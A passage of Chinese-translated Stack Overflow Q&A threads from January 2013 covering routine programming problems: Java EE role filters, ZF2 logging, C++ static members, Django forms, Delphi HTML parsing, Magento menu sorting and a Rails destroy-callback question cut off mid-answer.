    xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"
    version="3.0">

    ...

    <filter>
        <filter-name>Role Check Filter</filter-name>
        <filter-class>com.example.filter.RoleCheckFilter</filter-class>
    </filter>
    <filter-mapping>
        <filter-name>Role Check Filter</filter-name>
        <url-pattern>/admin/*</url-pattern>
    </filter-mapping>

    ...

</web-app> 
```

* * *

当然**，在您的情况下**，考虑到您使用*基本身份验证这一事实，在**web.xml*中进行安全配置（**声明式安全**）或使用**编程安全**要容易得多。

引用官方 Java EE 文档：

> 可以通过以下方式为 Web 应用程序实现 Java EE 安全服务：
> 
> *   **元数据注释**（或简称为注释）用于指定类文件中的安全信息。部署应用程序时，此信息可以由应用程序部署描述符使用或覆盖。
>     
>     
> *   **声明式安全**表示应用程序的安全结构，包括应用程序外部的部署描述符中的安全角色、访问控制和身份验证要求。
>     部署描述符中明确指定的任何值都会覆盖注释中指定的任何值。
>     
>     
> *   **程序化安全**嵌入在应用程序中，用于做出安全决策。当仅声明式安全不足以表达应用程序的安全模型时，程序安全很有用。

* * *

查看与保护 Java EE 应用程序相关的官方 Java EE 文档（在您的情况下，请注意**指定授权约束**部分）：
**[Java EE 6：保护 Web 应用程序](http://docs.oracle.com/javaee/6/tutorial/doc/gkbaa.html)**
**[Java EE 5：保护 Web 应用程序](http://docs.oracle.com/javaee/5/tutorial/doc/bncas.html)**

还可以查看官方文档中的示例：
**[Java EE 6。示例：保护 Web 应用程序](http://docs.oracle.com/javaee/6/tutorial/doc/bncbx.html)**
**[Java EE 5。示例：保护 Web 应用程序](http://docs.oracle.com/javaee/5/tutorial/doc/bncbx.html)**

# php - 在 ZF2 中记录每个请求

> ID：14348307
> 
> 赞同：0
> 
> 时间：2013-01-15T22:41:59.347
> 
> 标签：php, logging, zend-framework2, zend-log

我们正在为一个新的应用程序使用 zend 框架 2，我希望有相同的 Rails 或类似的日志系统，我希望每个请求都有一个日志，在 Zend 中可以做到这一点吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-16T09:33:45.830

这取决于*您*要记录的内容。如果它只是一个访问日志，你应该尝试使用网络服务器的日志。来自 Apache/nginx/IIS 等的日志的性能比您在 ZF2 应用程序中实现的要好。

如果您需要登录 ZF2 应用程序，您有两种选择。第一个选项是在`bootstrap`。它是您可以使用的最早选项之一，因此可能是最好的。但是，您也可以查看`route`或`dispatch`。这两个事件在应用程序的“运行”阶段被调用。有了这些事件，你就有了一个可用的路由匹配，因此你知道（或不知道）你的请求是否匹配任何控制器（或者如果你没有匹配，它是 404）。

一些例子。假设您在键`ServiceManager`下配置了一个记录器。`logger`然后登录`bootstrap`：

```
namespace Application;

class Module
{
  public function onBootstrap($e)
  {
    $app = $e->getApplication();
    $sm  = $app->getServiceManager();

    $logger = $sm->get('logger');
    $logger->debug('Log here!');
  }
} 
```

或者例如，如果您等待，则为该事件`route`附加一个侦听器：`route`

```
namespace Application;

use Zend\Mvc\MvcEvent;
use Zend\Mvc\Router\RouteMatch;

class Module
{
  public function onBootstrap($e)
  {
    $app = $e->getApplication();
    $em  = $app->getEventManager();
    $sm  = $app->getServiceManager();

    $logger = $sm->get('logger');
    $em->attach(MvcEvent::EVENT_ROUTE, function($e) use ($logger) {
      $match = $e->getRouteMatch();

      // No route, this is a 404
      if (!$match instanceof RouteMatch) {
        return;
      }

      $logger->debug(sprintf(
        'Route event with route %s',
        $match->getMatchedRouteName()
      ));
    });
  }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-16T06:50:23.967

听起来您可以将侦听器附加`dispatch`到`Zend\Mvc\Application`.

作为参考，Rob Allen 创建了一个方便的[ZF2 事件](http://akrabat.com/zend-framework-2/a-list-of-zf2-events/)列表。

# c++ - 将 XML 模拟为数据库

> ID：14348308
> 
> 赞同：0
> 
> 时间：2013-01-15T22:42:02.533
> 
> 标签：c++, map, multidimensional-array

我正在构建一个依赖于某些事件的双流系统，因此程序可以选择要使用的流（数据库或文件）。我有在使用文件时模拟数据库的想法，并想出了这个：std::list 将作为 SqlRow 并且映射将是相应的关联列和值值。为了说明：

```
typedef map<string, string> SqlColumn;
typedef list<SqlColumn> SqlRow; 
```

并像这样定义它`SqlRow *data = new SqlRow(0);` 当我做这样的事情时我得到一个错误：`data[row].insert(make_pair("Key", "Value"));`

```
error C2661: 'std::list<_Ty>::insert' : no overloaded function takes 1 arguments
1>        with
1>        [
1>            _Ty=SqlColumn
1>        ] 
```

我的意思是，编译器似乎正在创建某种多维列表。因为如果我在那里放置一些其他维度，它会起作用。（它实际上给了我另一个错误。但它确实指向我想要的地图。错误与它无关。但我会发布它。）

有人能告诉我到底发生了什么吗？

**附加信息：**错误 C2676：

```
binary '[' : 'SqlRow' does not define this operator or a conversion to a type acceptable to the predefined operator
error C2228: left of '.insert' must have class/struct/union 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T22:46:47.067

`data[row]`我不是 C++ 专家，但我认为你不能`data`成为对象指针。

# php - 在 CakePHP 中找不到 PHPUnit_Util_Skeleton_Test

> ID：14348318
> 
> 赞同：1
> 
> 时间：2013-01-15T22:43:20.097
> 
> 标签：php, phpunit, cakephp-2.2

我可以在一个名为 Agg 的插件中为每个模型运行单独的测试，但是当我尝试运行[CakeTestSuite](http://book.cakephp.org/2.0/en/development/testing.html#creating-test-suites)时，我得到一个错误。

```
class ModelsTest extends CakeTestSuite
{
    public static function suite()
    {
        $suite = new CakeTestSuite('All model tests');
        $suite->addTestDirectory(TESTS . 'Case' . DS . 'Model');
        return $suite;
    }
} 
```

运行该套件会生成此错误。

> 致命错误：第 77 行的 C:\work\zend\cake\Cake\TestSuite\CakeTestSuiteCommand.php 中找不到类 'PHPUnit_Util_Skeleton_Test'

我正在使用 PHP 5.3.15 并安装了 PHPUnit 3.7.12 和 CakePHP 2.2.5

通过 Web 和 CLI 运行测试时出现此错误。

任何帮助，将不胜感激。

**更新：**

如果我在 PEAR 文件夹中为 PHPUnit 搜索“PHPUnit_Util_Skeleton_Test”，则找不到它。这对我来说似乎很奇怪。我是否使用了错误版本的 PHPUnit？这门课是什么时候引入的？

**更新：**

似乎这个类在 PHPUnit 3.7.x 中不再使用，我想知道 CakePHP 2.2 是否只能与 PHPUnit 3.6 一起使用。我尝试卸载 pear 包，然后安装 3.6.x 版本但始终安装最新版本。关于如何降级 PHPUnit 的任何想法？

**更新：**

使用 --force 降级以安装旧版本的 PHPUnit 并不能解决问题。我尝试了 3.6.12、3.6.5 和 3.5。对于 3.6.12，我在 PHPUnit 代码中的某处遇到了 is_file() 错误。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-16T12:40:28.553

`PHPUnit_Util_Skeleton_Test`在 PHPUnit 3.6 中可用，请参阅[https://github.com/sebastianbergmann/phpunit/blob/3.6/PHPUnit/Util/Skeleton/Test.php](https://github.com/sebastianbergmann/phpunit/blob/3.6/PHPUnit/Util/Skeleton/Test.php)

我建议卸载*所有*phpunit 软件包并重新安装 phpunit 3.6

```
$ pear install phpunit/phpunit-3.6.12 
```

使用 降级单个 phpunit 包时可能会破坏依赖关系`--force`，这应该可以解决它。

# django - 从具有相同名称的输入中获取不同的值

> ID：14348321
> 
> 赞同：2
> 
> 时间：2013-01-15T22:43:45.730
> 
> 标签：django, forms, templates, views, hidden

我的模板中有这个表格：

```
<form method="POST" class="form" action="/groups/">
    {% csrf_token %}
    {% block hidden_debtors %}
        {% for name, email in debtor_info.items %}
            <input type="hidden" name="hidden-debtor" value="{{email}}">
        {% endfor %}
    {% endblock %}
    <input type="text" name="new-debtor" id="round-input" placeholder="Select Debtor(s)"></input>
    <button type="submit" name="add-debtor" class="btn btn-primary">Add Debtor</button>
</form> 
```

正如您所看到的，隐藏类型输入都共享名称“hidden-debtor”，但是它们每个都有不同的电子邮件值。我想知道如何通过循环或其他方式访问我的views.py中的每一个不同的值

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T22:52:47.420

您可以像这样在视图中获取值列表：

```
request.POST.getlist('hidden-debtor') 
```

[文档](https://docs.djangoproject.com/en/dev/ref/request-response/#django.http.QueryDict.getlist)

# html - 需要下拉菜单排队并保持原位

> ID：14348323
> 
> 赞同：0
> 
> 时间：2013-01-15T22:43:55.963
> 
> 标签：html, css

我正在尝试用另一个下拉框制作一个下拉框，但是每当我将鼠标悬停在一个上时，另一个就会进入下拉框的底部。

[这就是现在的情况。](http://www.jsfiddle.net/myDPb/)

感谢您的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T22:46:33.977

您可以设置`vertical-align`元素的属性

```
.sub{
  vertical-align:top;
} 
```

[**演示**](http://jsfiddle.net/mowglisanu/myDPb/1/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T22:49:58.197

问题在于`.sub{ display: inline-block; }`注入了不必要的定位特征。

如果您去掉 display 属性或将其设置为`block`，然后`float: left;`改为设置，您将获得所需的效果。

# performance - 在使用 CQRS 架构的 Windows Azure 应用程序中，读写数据库的最佳选择是什么？

> ID：14348324
> 
> 赞同：1
> 
> 时间：2013-01-15T22:44:09.703
> 
> 标签：performance, azure-storage, cqrs

在具有 CQRS 架构的 Windows Azure 中构建应用程序，如果您正在寻找最高性能，那么读写数据库的可选存储解决方案是什么？

*   阅读：非规范化表
*   写：事件存储

目前 Windows 提供了多种解决方案，例如：

*   Azure SQL 数据库
*   Azure 表存储
*   Hadoop

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-16T07:45:16.380

这取决于几个因素。特别是写入方面取决于您是否使用事件溯源。

（编辑：只需重新阅读您的问题。一定忽略了事件存储位。）

查看 Lokad.CQRS 以获取基于 Azure 的示例：[http ://lokad.github.com/lokad-cqrs/](http://lokad.github.com/lokad-cqrs/)

# apache - 为什么使用虚拟主机后 css 格式在站点上不起作用？

> ID：14348325
> 
> 赞同：0
> 
> 时间：2013-01-15T22:44:13.733
> 
> 标签：apache, xampp, virtualhost

再会，

我的设置`http-vhosts.conf`如下：

> 服务器名称：aserv.domain.com 目录：/htdocs
> 
> 服务器 2 名称：bserv.domain.com 目录：/htdocs/bserv

所以基本上服务器 2 可以像这样访问：`aserv.domain.com/bserv`.

当去`bserv.domain.com`显示是纯 html 没有 css 格式和图像。然而，当我访问时`aserv.domain.com/bserv`，该站点以正确的格式、css 和图像显示。此外，当从 访问时，登录等功能`bserv.domain.com`不起作用`aserv.domain.com/bserv`。

抱歉啰嗦了，即使我将服务器 2 的目录更改为 htdocs 外部，问题仍然存在。例如。`/htdocs2`.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-16T21:25:59.013

对于这个模糊的问题，我深表歉意，我设法通过更改`config.php`文件中的默认目录来解决这个问题。

我更改了 URL 的相对路径：`bserv.domain.com`

这对于其他实现开源 Web 解决方案并且缺少格式、css 和图像的解决方案很有用。

# c++ - 为什么在尝试在类中设置静态变量时出现链接器错误？

> ID：14348328
> 
> 赞同：1
> 
> 时间：2013-01-15T22:44:30.060
> 
> 标签：c++, class, static, undefined-reference

> **可能重复：**
> [类中的静态成员变量](https://stackoverflow.com/questions/5601051/static-member-variable-in-a-class)
> [什么是未定义的引用/未解决的外部符号错误，我该如何解决？](https://stackoverflow.com/questions/12573816/what-is-an-undefined-reference-unresolved-external-symbol-error-and-how-do-i-fix)

```
class test_struct {
  static int number;
 public:
  static void set() {
    number = 42;
  }
};

int main() {
  test_struct::set();
} 
```

错误是：

```
[...]Temp\ccGGxEAz.o:test.cpp:(.text.startup+0xf): undefined reference to `test_struct::number'
collect2.exe: error: ld returned 1 exit status 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-15T22:45:20.997

在使用它之前，您需要`test_struct::number`在源代码（.cpp）中定义静态成员：

```
class test_struct {
  static int number;
 public:
  static void set() {
    number = 42;
  }
};

int test_struct::number = 0; 
```

# jqgrid - JQGrid：将网格导出为 PDF

> ID：14348335
> 
> 赞同：0
> 
> 时间：2013-01-15T22:45:13.887
> 
> 标签：jqgrid, export-to-excel, export-to-csv

有没有办法将`JQGrid`数据导出到 Excel/PDF。我使用 SQL Server 2008 R2 作为数据库和 WCF 服务用于 HTTP 请求/响应。客户端使用 JavaScript 编写，AJAX 调用通过 WCF 服务与 SQL 数据库进行交互。

`excelExport`jqgrid的' '功能会起作用吗？

这是收集和存储网格数据的代码：

* * *

```
enter code here
function ExportExcel() {
    var mya=new Array();
    mya = $("#PrjBudgetGrid").getDataIDs();  // Get All IDs
    var data = $("#PrjBudgetGrid").getRowData(mya[0]);     // Get First row to get the labels
    var colNames=new Array(); 
    var ii=0;
    for (var i in data) {
        colNames[ii++] = i;
    }     // capture col names
    var html = "";
    for (i = 0; i < mya.length; i++) {
        data = $("#PrjBudgetGrid").getRowData(mya[i]); // get each row
        for (j = 0; j < colNames.length; j++) {
            html = html + data[colNames[j]] + "\t"; // output each column as tab delimited
        }
        html = html + "\n";  // output each row with end of line

    }
    html=html+"\n";  // end of line at the end
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T23:14:47.353

您可以使用[答案](https://stackoverflow.com/a/9349688/315935)中的代码，甚至更好地使用[另一个更新的答案](https://stackoverflow.com/a/13957161/315935)。将数据导出到 Excel 的代码部分可以轻松更改为 WCF 代码。请参阅[此处](https://stackoverflow.com/a/3079326/315935)的示例如何`Stream`用作 WCF 方法的输出。

# msmq - Winserver 2012 上的 Nservice 总线安装

> ID：14348341
> 
> 赞同：0
> 
> 时间：2013-01-15T22:45:43.073
> 
> 标签：msmq, nservicebus, windows-server-2012

我正在尝试在新的 win server 2012 机器上安装 nservice 总线，但工作不正常。任何帮助表示赞赏..

我的设置过早地失败了，当我转储到日志文件时..这是我得到的错误..

如有必要，调用自定义操作 NServiceBus.Wix.CustomActions!NServiceBus.Wix.CustomActions.CustomActions.InstallMsmq 安装/启动 MSMQ。CustomAction InstallMsmqAction 返回实际错误代码 1603（请注意，如果翻译发生在沙箱内，这可能不是 100% 准确） 操作于 16:36:36 结束：InstallFinalize。返回值 3\. 动作 16:36:36：回滚。回滚动作：

我必须手动添加 MSMQ 功能吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T23:10:47.057

是的，您需要先启用 MSMQ 功能。

顺便说一句，MSI 真的只能安装在开发人员机器上，要在生产中使用 powershell cmdlet 准备机器，请参阅[http://docs.particular.net/nservicebus/managing-nservicebus-using-powershell](http://docs.particular.net/nservicebus/managing-nservicebus-using-powershell)

你的开发机器是 WinServer 2012 吗？

# html - HTML 标签解析

> ID：14348346
> 
> 赞同：15
> 
> 时间：2013-01-15T22:46:00.503
> 
> 标签：html, delphi, delphi-xe2

如何使用 DIHtmlParser 从标签中解析**Name: & Value文本？**我尝试使用 Clever Components 的 TCLHtmlParser 进行此操作，但失败了。第二个问题是 DIHtmlParser 是否可以解析单个标签，例如循环遍历其子标签。对于这样一个简单的问题，它简直就是一场噩梦。

```
<div class="tvRow tvFirst hasLabel tvFirst" title="example1">
  <label class="tvLabel">Name:</label>
  <span class="tvValue">Value</span>
<div class="clear"></div></div>

<div class="tvRow tvFirst hasLabel tvFirst" title="example2">
  <label class="tvLabel">Name:</label>
  <span class="tvValue">Value</span>
<div class="clear"></div></div> 
```

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-01-16T00:40:36.200

您可以使用[`IHTMLDocument2`](http://msdn.microsoft.com/en-us/library/aa752574%28v=vs.85%29.aspx)DOM 从 HTML 中解析您需要的任何元素：

```
uses ActiveX, MSHTML;

const
  HTML =
  '<div class="tvRow tvFirst hasLabel tvFirst" title="example1">' +
  '<label class="tvLabel">Name:</label>' +
  '<span class="tvValue">Value</span>' +
  '<div class="clear"></div>' +
  '</div>';

procedure TForm1.Button1Click(Sender: TObject);
var
  doc: OleVariant;
  el: OleVariant;
  i: Integer;
begin
  doc := coHTMLDocument.Create as IHTMLDocument2;
  doc.write(HTML);
  doc.close;
  ShowMessage(doc.body.innerHTML);
  for i := 0 to doc.body.all.length - 1 do
  begin
    el := doc.body.all.item(i);
    if (el.tagName = 'LABEL') and (el.className = 'tvLabel') then
      ShowMessage(el.innerText);
    if (el.tagName = 'SPAN') and (el.className = 'tvValue') then
      ShowMessage(el.innerText);
  end;
end; 
```

* * *

我想提一下我今天发现的另一个非常好的 HTML 解析器：[`htmlp`](http://sourceforge.net/projects/htmlp/)（Delphi Dom HTML Parser and Converter）。它不像`IHTMLDocument2`显然那样灵活，但它非常易于使用、快速、免费，并且支持旧 Delphi 版本的 Unicode。

示例用法：

```
uses HtmlParser, DomCore;

function GetDocBody(HtmlDoc: TDocument): TElement;
var
  i: integer;
  node: TNode;
begin
  Result := nil;
  for i := 0 to HtmlDoc.documentElement.childNodes.length - 1 do
  begin
    node := HtmlDoc.documentElement.childNodes.item(i);
    if node.nodeName = 'body' then
    begin
      Result := node as TElement;
      Break;
    end;
  end;
end;

procedure THTMLForm.Button2Click(Sender: TObject);
var
  HtmlParser: THtmlParser;
  HtmlDoc: TDocument;
  i: Integer;
  body, el: TElement;
  node: TNode;
begin
  HtmlParser := THtmlParser.Create;
  try
    HtmlDoc := HtmlParser.parseString(HTML);
    try
      body := GetDocBody(HtmlDoc);
      if Assigned(body) then
        for i := 0 to body.childNodes.length - 1 do
        begin
          node := body.childNodes.item(i);
          if (node is TElement) then
          begin
            el := node as TElement;
            if (el.tagName = 'div') and (el.GetAttribute('class') = 'tvRow tvFirst hasLabel tvFirst') then
            begin
              // iterate el.childNodes here...
              ShowMessage(IntToStr(el.childNodes.length));
            end;
          end;
        end;
    finally
      HtmlDoc.Free;
    end;
  finally
    HtmlParser.Free
  end;
end; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T23:02:12.553

使用 HTML Parser 处理您的 html 文件。

也许[DIHtmlParser](http://www.yunqa.de/delphi/doku.php/products/htmlparser/index)会完成这项工作。

RegEx 不是解析器，从 HTML 转换为 JSON 不是一个明智的选择。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-03-28T21:40:16.533

还可以将[HTMLP 解析器](https://sourceforge.net/projects/htmlp/)与 THtmlFormatter 和[OXml XPath 解析结合使用](http://www.kluug.net/oxml.php)

```
uses
  // Htmlp
  HtmlParser,
  DomCore,
  Formatter,
  // OXml
  OXmlPDOM,
  OXmlUtils;

function HtmlToXHtml(const Html: string): string;
var
  HtmlParser: THtmlParser;
  HtmlDoc: TDocument;
  Formatter: THtmlFormatter;
begin
  HtmlParser := THtmlParser.Create;
  try
    HtmlDoc := HtmlParser.ParseString(Html);
    try
      Formatter := THtmlFormatter.Create;
      try
        Result := Formatter.GetText(HtmlDoc);
      finally
        Formatter.Free;
      end;
    finally
      HtmlDoc.Free;
    end;
  finally
    HtmlParser.Free;
  end;
end;

type
  TCard = record
    Store: string;
    Quality: string;
    Quantity: string;
    Price: string;
  end;
  TCards = array of TCard;

function ParseCard(const Node: PXMLNode): TCard;
const
  StoreXPath = 'div[1]/ax';
  QualityXPath = 'div[3]';
  QuantityXPath = 'div[4]';
  PriceXPath = 'div[5]';
var
  CurrentNode: PXMLNode;
begin
  Result := Default(TCard);
  if Node.SelectNode(StoreXPath, CurrentNode) then
     Result.Store := CurrentNode.Text;
  if Node.SelectNode(QualityXPath, CurrentNode) then
     Result.Quality := CurrentNode.Text;
  if Node.SelectNode(QuantityXPath, CurrentNode) then
     Result.Quantity := CurrentNode.Text;
  if Node.SelectNode(PriceXPath, CurrentNode) then
     Result.Price := CurrentNode.Text;
end;

procedure THTMLForm.OpenButtonClick(Sender: TObject);
var
  Html: string;
  Xml: string;
  FXmlDocument: IXMLDocument;
  QueryNode: PXMLNode;
  XPath: string;
  NodeList: IXMLNodeList;
  i: Integer;
  Card: TCard;
begin
  Html := System.IOUtils.TFile.ReadAllText(FileNameEdit.Text, TEncoding.UTF8);
  Xml := HtmlToXHtml(Html);
  Memo.Lines.Text := Xml;

  // Parse with XPath
  FXMLDocument := CreateXMLDoc;
  FXMLDocument.WriterSettings.IndentType := itIndent;
  if not FXMLDocument.LoadFromXML(Xml) then
    raise Exception.Create('Source document is not valid');
  QueryNode := FXmlDocument.DocumentElement;
  XPath := '//div[@class="row pricetableline"]';
  NodeList := QueryNode.SelectNodes(XPath);
  for i := 0 to NodeList.Count -1 do
  begin
    Card := ParseCard(NodeList[i]);
    Memo.Lines.Text := Memo.Lines.Text + sLineBreak +
      Format('%0:s %1:s %2:s %3:s', [Card.Store, Card.Quality, Card.Quantity, Card.Price]);
  end;

  Memo.SelStart := 0;
  Memo.SelLength := 0;
end; 
```

# wcf - WCF 4.0 中是否仍会自动生成客户端服务合同？

> ID：14348353
> 
> 赞同：0
> 
> 时间：2013-01-15T22:46:29.843
> 
> 标签：wcf, wcf-client, nettcpbinding, servicecontract

我有一个 net.tcp 绑定示例，它显然可以追溯到 .NET 2.0 运行时版本。WCF Net.TCP绑定示例的客户端代码有一个接口标记为“System.CodeDom.Compiler.GeneratedCodeAttribute("System.ServiceModel", "2.0.xx") 左右。

它还定义了一些请求和响应类，其中请求显然包装了服务操作合同的参数，而响应类包装了结果/返回值。它还为服务定义了一个控制器类。

现在，在带有 net.tcp 绑定的 winform 托管的 WCF 中，我找不到自己自动生成这些类的方法。我想知道，这是一种古老的做事方式吗？是必需的吗？或者我可以在客户端应用程序中包含对包含服务的 DLL 的引用吗？

我做了一些更改，但现在没有任何效果，我想知道我是否可以摆脱那些“自动生成”的类（或者如果不能，我该如何重新生成它们？）。

我在 Windows 7 Ultimate 下使用 Visual Studio 2012 Ultimate for .NET 4.5。我的应用程序是两个使用 WCF 和 netTCP 绑定的 winforms（客户端和服务器）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-16T19:06:17.000

显然，我必须将 svcutil 指向**基地址**而不是服务或端点的基地址。然后它将生成客户端代码和配置。

# jquery - Ajax 文件上传后更新记录

> ID：14348355
> 
> 赞同：0
> 
> 时间：2013-01-15T22:46:36.120
> 
> 标签：jquery, ajax, cakephp, file-upload

我正在尝试在上传 ajax 文件后更新表中的记录。

文件上传工作正常，我有一个函数 uploadFinished 返回服务器上上传文件的路径。在我的控制器中，我有一个更新当前项目的功能。

```
if(!empty($this->data)){
            if($this->Project->save($this->data)){
                if($this->RequestHandler->isAjax()){
                    $this->render('success', 'ajax');
                } else {
                    $this->Session->setFlash('Message Sent');
                    $this->redirect(array('action'=>'index'));
                }
            }
        } 
```

我在 uploadFinished 函数中设置 ajax 请求时遇到问题。我在网上搜索过，我想我需要使用这样的东西：

```
 $.ajax({                    
    url:'/projects/set_ref',
    type:"POST",                                        
    data:data
}); 
```

但我不太确定如何设置数据。如果有人能把我引向正确的方向，我将不胜感激。干杯!

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T23:35:40.397

我将在 Kevin B. 的帮助下发布我是如何解决这个问题的，以帮助任何面临同样问题的人。

为了通过 ajax 向控制器传递信息，我在图像上传的成功回调中创建了一个 ajax 请求。图片上传函数在响应变量中返回服务器上文件的路径+文件名，然后我可以将其传递给控制器​​：

```
var data = {"ref":response};

$.ajax({                    
url:'/projects/set_ref',
type:"POST",                                        
data:data
}); 
```

# php - 更改 Magento 菜单子类别排序顺序

> ID：14348361
> 
> 赞同：0
> 
> 时间：2013-01-15T22:47:07.440
> 
> 标签：php, magento, menu

我正在使用以下代码在下拉菜单中显示类别和子类别，但是我希望子类别按字母顺序排序......我该怎么做？

```
<ul id="custom-menu">
<li><a href="http://www.mobiledistributorsupply.com"><b>Home</b></a></li>
<?php $_helper = Mage::helper('catalog/category') ?>
<?php $_categories = $_helper->getStoreCategories() ?>
<?php $currentCategory = Mage::registry('current_category') ?>
<?php if (count($_categories) > 0): ?>
<ul style="width:940px;">
    <?php foreach($_categories as $_category): ?>
        <li>
<b><a class="drop" href="<?php echo $_helper->getCategoryUrl($_category) ?>">
                <?php echo $_category->getName() ?>
            </a></b>
<?php $_category = Mage::getModel('catalog/category')->load($_category->getId()) ?>
            <?php $_subcategories = $_category->getChildrenCategories() ?>
            <?php if (count($_subcategories) > 0): ?>
                <div class="dropdown_1column" style="width:235px;">
                    <?php foreach($_subcategories as $_subcategory): ?>
                        <div class="col_1">
                     <a href="<?php echo $_helper->getCategoryUrl($_subcategory) ?>">
                                <?php echo $_subcategory->getName() ?>
                            </a>
                        </div>
                    <?php endforeach; ?>
                    <div class="clr" clear="all"></div>
                </div>
            <?php endif; ?>
        </li>
    <?php endforeach; ?>
<li class="normal"><a href="/products/onsale"><b>Sale</b></a></li>
<li class="normal"><a href="/customer-service"><b>Help</b></a></li>
<li class="normal"><a href="/customer/account/create/"><b>Open Account</b></a></li>
</ul>
<?php endif; ?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-16T00:08:42.363

由于我们的客户通常没有经常更改的类别，因此我一直在做的事情是在管理后端按字母顺序拖放它们：`Catalog > Categories > Manage Categories`.

如果这不是你的风格，你总是可以从这个答案中得到一些建议，首先运行类别，将它们放在一个新数组中，然后对数组进行键排序，最后输出：[https ://stackoverflow.com/a/4273912 /823549](https://stackoverflow.com/a/4273912/823549)

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2014-05-27T09:53:12.053

首先备份您的 topmenu.phtml，然后在新的 topmenu.phtml 文件中替换以下代码

```
<?php $_helper = Mage::helper('catalog/category') ?>
<?php $_categories = $_helper->getStoreCategories() ?>
<?php

function array_sort($array, $on, $order=SORT_ASC){
    $new_array = array();
    $sortable_array = array();

    if (count($array) > 0) {
        foreach ($array as $k => $v) {
            if (is_array($v)) {
                foreach ($v as $k2 => $v2) {
                    if ($k2 == $on) {
                        $sortable_array[$k] = $v2;
                    }
                }
            } else {
                $sortable_array[$k] = $v;
            }
        }

        switch ($order) {
            case SORT_ASC:
            asort($sortable_array);
            break;
            case SORT_DESC:
            arsort($sortable_array);
            break;
        }

        foreach ($sortable_array as $k => $v) {
            $new_array[$k] = $array[$k];
        }
    }

    return $new_array;
}

?>
<?php
$layer = Mage::getSingleton('catalog/layer');
$_category = $layer->getCurrentCategory();
$currentCategoryId= $_category->getId();
?>
<div class="nav-container">
    <ul id="nav">
    <?php $_helper = Mage::helper('catalog/category') ?>
    <?php $_categories = $_helper->getStoreCategories() ?>
    <?php $currentCategory = Mage::registry('current_category') ?>
    <?php if (count($_categories) > 0){ ?>
        <?php foreach($_categories as $_category){ ?>
            <?php $_category = Mage::getModel('catalog/category')->load($_category->getId()) ?>
            <li><a href="<?php echo $_helper->getCategoryUrl($_category) ?>"><span><?php echo $_category->getName(); ?></span></a>
            <?php $catList = array();?>
            <?php $_subcategories = $_category->getChildrenCategories() ?>
            <?php foreach($_subcategories as $_subCategory){ ?>
                <?php $catList[] = array('name' => $_subCategory->getName(), 'url' => $_subCategory->getUrl(), 'id' => $_subCategory->getId());?>
            <?php } ?>
            <?php $catList = array_sort($catList, 'name', SORT_ASC);?>
            <ul>
            <?php if (count($catList) > 0){ ?>
                <?php $subcat=0?>
                <?php foreach($catList as $_subCategory){ ?>
                    <li><a href="<?php echo $_subCategory['url'] ?>"><span><?php echo $_subCategory['name'] ?></span></a>
                    <?php $subCatList = array();?>
                    <?php $_subSubCat = Mage::getModel('catalog/category')->load($_subCategory['id']);
                    $_subSubCategories = $_subSubCat->getChildrenCategories();?>
                    <?php foreach($_subSubCategories as $_subSubCategory){ ?>
                        <?php $subCatList[] = array('name' => $_subSubCategory['name'], 'url' => $_subSubCategory['url']);?>
                    <?php } ?>
                    <?php $subCatList = array_sort($subCatList, 'name', SORT_ASC);?>
                    <?php if (count($subCatList) > 0){ ?>
                        <ul>
                            <?php foreach($subCatList as $_subSubCat){ ?>
                                <li><a href="<?php echo $_subSubCat['url'] ?>"><span><?php echo $_subSubCat['name'] ?></span></a>
                            <?php } ?>
                            </li>
                        </ul>
                    <?php } ?>
                    </li>
                <?php } ?>

                <?php } ?>
            </ul>
            </li>
        <?php } ?>
    <?php } ?>
    </ul>
</div> 
```

# ruby-on-rails - child 的 after_destroy 回调保存了 parent 的依赖，当 parent 被销毁时会导致问题

> ID：14348362
> 
> 赞同：4
> 
> 时间：2013-01-15T22:47:20.017
> 
> 标签：ruby-on-rails, ruby, rails-activerecord

我有一种情况，我想在另一个对象被销毁后更新父对象的依赖关系。这是类层次结构的示例：

```
class Parent < ActiveRecord::Base
  has_one  :info, :dependent => :destroy
  has_many :conditions, :dependent => :destroy
  ....
end

class Info < ActiveRecord::Base
  belongs_to :parent

  def recalculate
    # Do stuff
  end
  ....
end

class Condition < ActiveRecord::Base
  belongs_to :parent
  has_one :condition_detail

  after_destroy :update_info

  def update_info
    parent.info.recalculate
    parent.info.save(:validate => false)
  end
  ....
end 
```

问题是当父级被销毁时，它会破坏条件，然后触发 after_destroy 回调并在 info 对象已经被销毁后保存它。所以在父级被销毁后，信息仍然存在。如果我不绕过验证，保存将默默地失败，这是我不想要的。并使用保存！引发异常。

Condition 上的回调必须是 after_destroy，否则 Info 上的 recalculate 方法将无法正确表示关系的状态来计算它需要什么。

我觉得当父级被销毁时我需要一种绕过回调的方法，但我认为这是不可能的。我不能使用dependent => delete_all，因为这不会破坏 Condition 的孩子。我尝试查看是否有一种方法可以判断父级是否调用了 destroy 并使用该信息绕过 after_destroy 中的保存，但这似乎也不起作用。

任何帮助将不胜感激，谢谢！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-15T23:13:54.903

我看到有两个选项：

